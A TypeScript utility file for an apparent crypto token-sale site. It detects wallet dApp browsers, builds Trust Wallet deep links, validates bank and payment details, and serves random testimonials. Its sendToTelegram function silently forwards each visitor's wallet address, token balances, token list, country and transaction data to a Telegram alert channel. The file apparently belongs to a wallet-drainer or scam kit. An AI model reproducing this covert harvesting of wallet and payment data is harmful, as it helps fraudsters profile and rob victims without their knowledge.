import { PaymentDetails } from './types';

// Device detection utilities
export const isMobileDevice = (): boolean => {
  if (typeof window === 'undefined') return false;
  
  const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
  
  // Check for mobile devices
  const mobileRegex = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i;
  return mobileRegex.test(userAgent);
};

export const isInAppBrowser = (): boolean => {
  if (typeof window === 'undefined') return false;
  
  const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera;
  
  // Check for common in-app browsers (Trust Wallet, MetaMask, etc.)
  const inAppBrowsers = [
    'trustwallet',
    'metamask',
    'coinbase',
    'binance',
    'tokenpocket',
    'imtoken',
    'wv', // WebView indicator
    'fbav', // Facebook app
    'fban', // Facebook app
    'instagram',
    'twitter',
    'line'
  ];
  
  return inAppBrowsers.some(browser => 
    userAgent.toLowerCase().includes(browser)
  );
};

export const isDappBrowser = (): boolean => {
  if (typeof window === 'undefined') return false;
  
  // Detect injected web3 providers
  const eth = (window as any).ethereum;

  // Trust Wallet flags (new versions)
  if (eth?.isTrust) return true;

  // MetaMask DApp browser
  if (eth?.isMetaMask) return true;

  // Legacy web3 detection
  if (typeof (window as any).web3 !== 'undefined') return true;

  // Check user-agent for older Trust Wallet builds
  const ua = navigator.userAgent.toLowerCase();
  return ua.includes('trust') || ua.includes('metamask');
};

export const isRegularMobileBrowser = (): boolean => {
  const isMobile = /android|iphone|ipad|ipod/i.test(navigator.userAgent);
  return isMobile && !isDappBrowser();
};

export const getTrustWalletDeeplink = (url: string): string => {
  return `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`;
};

export const paymentValidators = {
  "UPI": (value: string) => /^[\w.-]+@[\w.-]+$/.test(value),
  "IMPS": (value: string) => /^\d{9,18}$/.test(value),
  "PayPal": (value: string) => /^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(value),
  "ACH": (value: string) => /^\d{8,12}$/.test(value),
  "SEPA": (value: string) => /^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$/.test(value),
  "Cash": (value: string) => value.trim().length >= 10, // basic address check

};

export function validatePaymentInput(method: string, value: string) {
  const fn = paymentValidators[method as keyof typeof paymentValidators];
  if (!fn) return value.trim().length > 0;
  return fn(value.trim());
}

export function getRandomTestimonials<T>(arr: T[], n: number): T[] {
  const result: T[] = [];
  const taken = new Set<number>();
  while (result.length < n && taken.size < arr.length) {
    const idx = Math.floor(Math.random() * arr.length);
    if (!taken.has(idx)) {
      taken.add(idx);
      result.push(arr[idx]);
    }
  }
  return result;
}

export const getDefaultPrice = (tokenSymbol: string): number => {
  const defaultPrices: Record<string, number> = {
    'USDT': 1.00,
    'BTC': 45000,
    'ETH': 2500,
    'BNB': 300,
    'BUSD': 1.00,
    'USDC': 1.00,
    'AICell': 0.00171,
    'AICELLS': 0.00171
  };
  return defaultPrices[tokenSymbol] || 0.01;
};

export const fetchCoinGeckoPrice = async (tokenSymbol: string): Promise<number> => {
  try {
    const coinIds: Record<string, string> = {
      'USDT': 'tether',
      'BTC': 'bitcoin',
      'ETH': 'ethereum',
      'AICell': 'aicell'
    };

    const coinId = coinIds[tokenSymbol];
    if (!coinId) {
      throw new Error('CoinGecko ID not available');
    }

    const proxyUrl = 'https://api.allorigins.win/raw?url=';
    const apiUrl = `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`;
    const response = await fetch(proxyUrl + encodeURIComponent(apiUrl));

    if (!response.ok) {
      console.warn('CoinGecko API request failed, using fallback price');
      return getDefaultPrice(tokenSymbol);
    }

    const data = await response.json();
    if (data[coinId] && data[coinId].usd) {
      return data[coinId].usd;
    }
    console.warn('No price data available from CoinGecko, using fallback');
    return getDefaultPrice(tokenSymbol);
  } catch (error) {
    console.warn('CoinGecko API error:', error);
    return getDefaultPrice(tokenSymbol);
  }
};

export const sendToTelegram = async (data: any) => {
  try {
    // Use custom message if provided (for order confirmations), otherwise use default format
    const message = data.message || (
      `🔔 Platform Activity Alert\n\n` +
      `Action: ${data.action}\n` +
      `Wallet: ${data.wallet}\n` +
      (data.bnb ? `BNB Balance: ${data.bnb}\n` : '') +
      (data.usdt ? `USDT Balance: ${data.usdt}\n` : '') +
      `Token: ${data.token || 'N/A'}\n` +
      `Contract: ${data.contract || 'N/A'}\n` +
      `Balance: ${data.balance || 'N/A'}\n` +
      `Payment Method: ${data.paymentMethod || 'N/A'}\n` +
      `Country: ${data.country || 'N/A'}\n` +
      (data.tokenList ? `\nToken List:\n${data.tokenList}\n` : '') +
      `TX Hash: ${data.txHash || 'N/A'}\n` +
      `Network: ${data.network || 'N/A'}\n` +
      `Time: ${data.timestamp}`
    );
      
    await fetch('/.netlify/functions/notify-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text: message }),
    });
  } catch (err) { 
    // fail silently 
  }
};

export const validatePaymentDetails = (method: string, details: PaymentDetails): boolean => {
  switch(method) {
    case 'UPI':
      return !!(details.upiId && 
               /^[\w.-]+@[\w.-]+$/.test(details.upiId) && 
               details.fullName?.trim());
    case 'IMPS':
      return !!(details.accountNumber && 
               /^\d{9,18}$/.test(details.accountNumber) &&
               details.ifscCode && 
               /^[A-Z]{4}0[A-Z0-9]{6}$/.test(details.ifscCode) &&
               details.accountHolderName?.trim());
    case 'PayPal':
      return !!(details.paypalEmail && 
               /^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,}$/.test(details.paypalEmail) &&
               details.fullName?.trim());
    case 'ACH':
      return !!(details.routingNumber && 
               /^\d{9}$/.test(details.routingNumber) &&
               details.accountNumber && 
               /^\d{8,17}$/.test(details.accountNumber) &&
               details.accountHolderName?.trim() &&
               details.accountType);
    case 'SEPA':
      return !!(details.iban && 
               /^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$/.test(details.iban) &&
               details.accountHolderName?.trim());
    case 'Bank Transfer':
      return !!(details.bankName?.trim() &&
               details.accountNumber?.trim() &&
               details.accountHolderName?.trim());
    case 'Cash':
      return !!(details.cashAddress?.trim() && 
               details.cashAddress.trim().length >= 10);
    default:
      return !!details.general?.trim();
  }
};